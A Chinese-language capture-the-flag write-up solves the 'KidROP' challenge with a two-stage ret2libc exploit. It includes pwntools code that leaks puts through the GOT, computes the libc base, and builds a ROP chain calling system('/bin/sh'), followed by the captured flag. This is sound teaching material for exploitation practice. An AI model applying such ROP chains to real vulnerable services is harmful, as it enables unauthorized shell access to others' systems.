# KidROP

## 题目简述

WelcomeCTF2021 的 KidROP 继续使用 32 字节 `gets` 栈溢出，但二进制中不再直接提供 `/bin/sh` 和可用的 `system`。二进制关闭 PIE，远端同时提供匹配的 libc，目标是先泄漏 libc 地址，再进行第二阶段 ret2libc。

## 解题过程

返回地址偏移仍为 40 字节。第一阶段调用 `puts(puts@got)` 泄漏 libc 中 `puts` 的真实地址，然后返回 `vuln` 再读一次输入：

```python
stage1 = b"A" * 40
stage1 += p64(pop_rdi_ret)
stage1 += p64(elf.got["puts"])
stage1 += p64(elf.plt["puts"])
stage1 += p64(elf.symbols["vuln"])
```

收到泄漏后，用附件 libc 中的符号偏移计算基址：

```python
puts_runtime = u64(leak.ljust(8, b"\0"))
libc.address = puts_runtime - libc.symbols["puts"]
system = libc.symbols["system"]
bin_sh = next(libc.search(b"/bin/sh\0"))
```

第二阶段设置 `RDI` 指向 libc 中的 `/bin/sh`，并调用 `system`：

```python
stage2 = b"A" * 40
stage2 += p64(ret_gadget)
stage2 += p64(pop_rdi_ret)
stage2 += p64(bin_sh)
stage2 += p64(system)
```

额外 `ret` 用于栈对齐。成功后读取：

```text
greyhats{g00d_j0b_d0ing_l1bc_l34k_2y389hd82}
```

## 方法总结

两阶段 ret2libc 的固定套路是“泄漏 GOT—回到可重入函数—计算 libc 基址—调用 system”。所有运行时地址都应由所给 ELF 和 libc 的符号偏移计算，不能照抄某次运行的绝对地址。
